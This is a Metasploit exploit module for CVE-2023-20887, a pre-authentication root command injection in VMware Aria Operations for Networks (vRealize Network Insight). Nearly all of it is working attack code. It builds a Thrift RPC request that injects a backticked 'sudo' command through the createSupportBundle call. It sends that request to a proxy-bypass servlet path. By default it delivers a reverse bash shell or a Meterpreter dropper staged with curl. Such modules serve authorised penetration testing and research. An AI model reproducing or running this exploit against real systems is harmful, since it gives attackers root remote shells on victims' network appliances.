##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VMWare Aria Operations for Networks (vRealize Network Insight) pre-authenticated RCE',
        'Description' => %q{
          VMWare Aria Operations for Networks (vRealize Network Insight) is vulnerable to command injection when accepting user input through the Apache Thrift RPC interface. This vulnerability allows a remote unauthenticated attacker to execute arbitrary commands on the underlying operating system as the root user. The RPC interface is protected by a reverse proxy which can be bypassed. VMware has evaluated the severity of this issue to be in the Critical severity range with a maximum CVSSv3 base score of 9.8.
          a malicious actor can get remote code execution in the context of 'root' on the appliance.
          VMWare 6.x version are vulnerable.

          This module exploits the vulnerability to upload and execute payloads gaining root privileges.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Sina Kheirkhah', # Metasploit Module (@SinSinology) of Summoning Team (@SummoningTeam) on twitter
        ],
        'References' => [
            ['CVE', 'CVE-2023-20887'],
            ['URL', 'https://www.vmware.com/security/advisories/VMSA-2023-0012.html'],
            ['URL', 'https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-20887/'],
        ],
        'DisclosureDate' => '2023-06-07',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix (In-Memory)',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :in_memory,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => [ 'curl', 'printf' ],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
  end

  def check_vrni
    return send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/api/vip/i18n/api/v2/translation/products/vRNIUI/versions/6.8.0/locales/en-GB/components/UI?pseudo=false')
    })
  rescue StandardError => e
    elog("#{peer} - Communication error occurred: #{e.message}", error: e)
    fail_with(Failure::Unknown, "Communication error occurred: #{e.message}")
  end

  def execute_command(cmd, _opts = {})
    print_status("pop thy shell!!!")
    pop_thy_shell = "[1,\"createSupportBundle\",1,0,{\"1\":{\"str\":\"1111\"},\"2\":{\"str\":\"`sudo #{cmd}`\"},\"3\":{\"str\":\"value3\"},\"4\":{\"lst\":[\"str\",2,\"AAAA\",\"BBBB\"]}}]"

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path,'/saas./resttosaasservlet'),
      'ctype' => 'application/x-thrift',
      'headers' => {
        'Accept' => 'application/json, text/plain, */*'
      },
      'encode_params' => false,
      'data'     => pop_thy_shell
     })

  rescue StandardError => e
    elog("#{peer} - Communication error occurred: #{e.message}", error: e)
    fail_with(Failure::Unknown, "Communication error occurred: #{e.message}")
  end

  # Checking if the target is potential vulnerable checking the json response to contain the vRNIUI string
  # that indicates the target is running VMWare Aria Operations for Networks (vRealize Network Insight)
  def check
    print_status("Checking if #{peer} can be exploited.")
    res = check_vrni
    return CheckCode::Unknown('No response received from the target!') unless res

    body = res.get_json_document
    if body.nil? || body['data']['productName'] != 'vRNIUI'
      return CheckCode::Safe('Target is not running VMWare Aria Operations for Networks (vRealize Network Insight).')
    end

    return CheckCode::Vulnerable if body['data']['productName'] == "6.8.0"

    CheckCode::Appears('Target is running VMWare Aria Operations for Networks (vRealize Network Insight).')
  end

  def exploit
    case target['Type']
    when :in_memory
      print_status("Executing #{target.name} with #{payload.encoded}")
      execute_command(payload.encoded)
    when :linux_dropper
      print_status("Executing #{target.name}")
      execute_cmdstager
    end
  end
end
